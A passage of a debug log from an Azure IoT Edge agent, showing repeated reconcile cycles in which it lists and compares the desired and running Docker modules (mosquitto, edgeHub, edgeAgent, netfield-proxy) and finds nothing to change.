<7> 2019-09-11 15:29:24.037 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:24.038 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:29.044 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:29.044 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:29.045 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:29.045 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:29.046 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:29.049 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:29.049 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:29.072 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:29.074 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:29.088 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:29.091 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:29.095 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:29.106 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:29.106 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:34.114 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:34.114 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:34.115 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:34.115 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:34.115 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:34.116 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:34.116 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:34.147 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:34.149 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:34.162 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:34.167 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:34.173 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:34.179 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:34.180 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:39.181 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:39.181 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:39.182 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:39.182 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:39.182 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:39.183 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:39.183 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:39.206 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:39.207 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:39.222 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:39.226 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:39.232 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:39.243 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:39.244 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:44.254 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:44.254 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:44.255 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:44.255 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:44.256 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:44.256 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:44.257 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:44.282 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:44.284 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:44.300 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:44.303 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:44.309 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:44.316 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:44.316 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:49.324 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:49.324 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:49.324 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:49.325 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:49.325 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:49.325 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:49.326 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:49.350 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:49.352 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:49.365 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\